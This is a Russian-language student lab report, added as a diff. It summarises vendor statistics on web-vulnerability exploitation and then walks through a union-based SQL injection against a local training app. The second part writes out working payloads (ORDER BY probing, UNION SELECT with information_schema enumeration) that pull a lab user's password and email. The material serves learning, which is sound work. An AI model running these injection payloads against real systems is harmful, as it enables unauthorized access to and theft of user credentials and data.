@@ -1,0 +1,106 @@
+<h1>Часть 1</h1>
+<h2>1. Источники</h2>
+<ol>
+<li><p><a href="https://www.verizon.com/business/resources/reports/dbir/">https://www.verizon.com/business/resources/reports/dbir/</a></p>
+</li>
+<li><p><a href="https://deepstrike.io/blog/vulnerability-statistics-2025">https://deepstrike.io/blog/vulnerability-statistics-2025</a></p>
+</li>
+<li><p><a href="https://www.recordedfuture.com/research/h1-2025-malware-and-vulnerability-trends">https://www.recordedfuture.com/research/h1-2025-malware-and-vulnerability-trends</a></p>
+</li>
+<li><p><a href="https://medium.com/@zahirbdby/sql-injection-attacks-cost-companies-8-7m-heres-what-every-developer-must-know-ca614b7296b1">https://medium.com/@zahirbdby/sql-injection-attacks-cost-companies-8-7m-heres-what-every-developer-must-know-ca614b7296b1</a></p>
+</li>
+<li><p><a href="https://www.vikingcloud.com/blog/cybersecurity-statistics#:~:text=Device%20and%20Cloud%20Security%20Threats,one%20cloud%20attack%20a%20year.&text=78.,incidents%20result%20in%20data%20breaches.&text=79.,them%20alone%20caused%20by%20misconfigurations.&text=80.,part%20due%20to%20human%20error.&text=81.,are%20still%20vulnerable%20to%20attack.&text=82.,one%20known%20but%20unaddressed%20risk.&text=83.,%25%20year-on-year.&text=84.,are%20growing%20by%2020%25%20annually">https://www.vikingcloud.com/blog/cybersecurity-statistics#:~:text=Device%20and%20Cloud%20Security%20Threats,one%20cloud%20attack%20a%20year.&amp;text=78.,incidents%20result%20in%20data%20breaches.&amp;text=79.,them%20alone%20caused%20by%20misconfigurations.&amp;text=80.,part%20due%20to%20human%20error.&amp;text=81.,are%20still%20vulnerable%20to%20attack.&amp;text=82.,one%20known%20but%20unaddressed%20risk.&amp;text=83.,%25%20year-on-year.&amp;text=84.,are%20growing%20by%2020%25%20annually</a></p>
+</li>
+</ol>
+<h2>2. Доля успешных атак через эксплуатацию веб-уязвимостей</h2>
+<p>Многие сайты выделяют долю эксплуатации уязвимостей в целом (не только веб).<br>Я постаралась выделить долю веб-атак.</p>
+<h3>2.1 Verizon DBIR 2024</h3>
+<p>Согласно отчёту:</p>
+<ul>
+<li>~23% всех подтверждённых атак происходят через эксплуатацию уязвимостей.</li>
+</ul>
+<p>DBIR также указывает, что:</p>
+<ul>
+<li>Веб-приложения являются одной из самых атакуемых поверхностей.</li>
+<li>Значительная часть эксплуатаций связана с публично доступными сервисами.</li>
+</ul>
+<h3>2.2 Уточнение по веб-вектору (DeepStrike)</h3>
+<p>DeepStrike указывает, что:</p>
+<ul>
+<li>~20% успешных атак инициируются через эксплуатацию уязвимостей.</li>
+<li>Большинство активно эксплуатируемых уязвимостей доступны по сети без аутентификации.</li>
+<li>Основной атакуемый слой — публичные веб-сервисы и интернет-доступные приложения.</li>
+</ul>
+<p>Вывод по двум сайтам:</p>
+<p>Из 20–23% атак через эксплуатацию уязвимостей, значительная часть относится именно к веб-уязвимостям, поскольку атаки происходят через публично доступные сервисы.</p>
+<h2>3. Распределение по категориям веб-уязвимостей, приводящих к успешным атакам</h2>
+<h3>3.1 Recorded Future (H1 2025)</h3>
+<p>Среди реально эксплуатируемых уязвимостей:</p>
+<table>
+<thead>
+<tr>
+<th>Категория (включая веб-контекст)</th>
+<th>Доля</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Remote Code Execution (включая web RCE)</td>
+<td>~33%</td>
+</tr>
+<tr>
+<td>Authentication Bypass (в т.ч. веб)</td>
+<td>~18–22%</td>
+</tr>
+<tr>
+<td>Improper Authorization / Access Control</td>
+<td>~15–18%</td>
+</tr>
+<tr>
+<td>Injection (SQL инъекции, Command Injection)</td>
+<td>~10–12%</td>
+</tr>
+<tr>
+<td>Deserialization (часто в веб-API)</td>
+<td>~5–8%</td>
+</tr>
+<tr>
+<td>Прочие</td>
+<td>~10%</td>
+</tr>
+</tbody></table>
+<h3>3.2 Веб-атаки отдельно (SQL инъекции)</h3>
+<ul>
+<li>SQL инъекции составляют ~65% веб-атак.</li>
+</ul>
+<p>Вывод</p>
+<ol>
+<li>Около 20–23% успешных атак происходят через эксплуатацию уязвимостей.</li>
+<li>Значительная часть этих атак связана с веб-сервисами.</li>
+<li>Среди веб-уязвимостей, приводящих к успешным атакам, доминируют:<ul>
+<li>Remote Code Execution</li>
+<li>Authentication Bypass</li>
+<li>Broken Access Control</li>
+<li>Injection (включая SQL инъекции)</li>
+</ul>
+</li>
+</ol>
+<h1>Часть 2</h1>
+<p>Перешла на localhost:8080<br>Установила базу данных.<br>Потом решила ввести id=9: <a href="http://localhost:8080/task/?id=09">http://localhost:8080/task/?id=09</a><br>Случайным образом узнала, что у Volk2 id=9.<br>Подумала, а вдруг у всех такой айди, поэтому посмотрела логин у пользователя с id=8, там оказался Kesha: <a href="http://localhost:8080/task/?id=08">http://localhost:8080/task/?id=08</a><br>Далее к ссылке добавила кавычку, чтобы посмотреть есть ли уязвимость: <a href="http://localhost:8080/task/?id=09">http://localhost:8080/task/?id=09</a>&#39;<br>Выдало: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1<br>Значит, есть уязвимость</p>
+<p>Методом перебора обнаружила, что айди всего 9 штук. </p>
+<p>Далее с помощью order by определяла количество столбцов  </p>
+<ul>
+<li><a href="http://localhost:8080/task/?id=09">http://localhost:8080/task/?id=09</a>&#39; order by 1 --+  </li>
+<li><a href="http://localhost:8080/task/?id=09">http://localhost:8080/task/?id=09</a>&#39; order by 2 --+  </li>
+<li><a href="http://localhost:8080/task/?id=09">http://localhost:8080/task/?id=09</a>&#39; order by 3 --+  </li>
+<li><a href="http://localhost:8080/task/?id=09">http://localhost:8080/task/?id=09</a>&#39; order by 4 --+</li>
+</ul>
+<p>На последнем выдало: Unknown column &#39;4&#39; in &#39;order clause&#39;<br>Значит, количество столбцов равно трём.  </p>
+<p>Изначально я пыталась этот запрос делать без кавычки (<a href="http://localhost:8080/task/?id=09">http://localhost:8080/task/?id=09</a> order by 4 --+). Я долго не могла понять, почему никакой ошибки не выдаёт даже на 10000. Наверняка же в БД не столько столбцов. С помощью интернета я поняла, в чём ошибка.</p>
+<p>Дальше, чтобы узнать имя базы данных ввела запрос (цифру 3 пишу, чтобы соблюсти синтаксис union)<br><a href="http://localhost:8080/task/?id=10">http://localhost:8080/task/?id=10</a>&#39; union select 1,database(),3 --+<br>В поле айди отобразилось 1, а в поле логина отобразилось название базы данных: security. Так получилось, потому что мы передали несуществующий айди, и вместо столбцов ввели свои данные.</p>
+<p>Дальше я захотела узнать список всех таблиц в БД.<br><a href="http://localhost:8080/task/?id=10">http://localhost:8080/task/?id=10</a>&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+<br>Вывело:<br>Ваш id:1<br>Ваш логин:emails,users  </p>
+<p>Далее узнаю названия столбцов в таблице users<br><a href="http://localhost:8080/task/?id=10">http://localhost:8080/task/?id=10</a>&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+<br>Вывело:<br>Ваш id:1<br>Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password  </p>
+<p>Чтобы узнать пароль для Volk2, ввожу такой запрос<br><a href="http://localhost:8080/task/?id=10">http://localhost:8080/task/?id=10</a>&#39; union select 1,password,3 from users where username=&#39;Volk2&#39; --+<br>Вывело:<br>Ваш id:1<br>Ваш логин:Wa spoiuuuuu  </p>
+<h2>Значит, пароль для пользователя с логином Volk2 - Wa spoiuuuuu</h2>
+<p>Аналогично с таблицей emails.<br>Узнаю названия столбцов<br><a href="http://localhost:8080/task/?id=10">http://localhost:8080/task/?id=10</a>&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;emails&#39; --+<br>Вывело:<br>Ваш id:1<br>Ваш логин:id,email_id  </p>
+<p>Смотрю, что лежит в email_id для пользователя Vinni-pukh (его id узнала заранее. он равен 4)<br><a href="http://localhost:8080/task/?id=10">http://localhost:8080/task/?id=10</a>&#39; union select 1,email_id,3 from emails where id=4 --+<br>Вывело:<br>Ваш id:1<br>Ваш логин:<a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a>  </p>
+<h2>Значит, email пользователя Vinni-pukh - <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></h2>
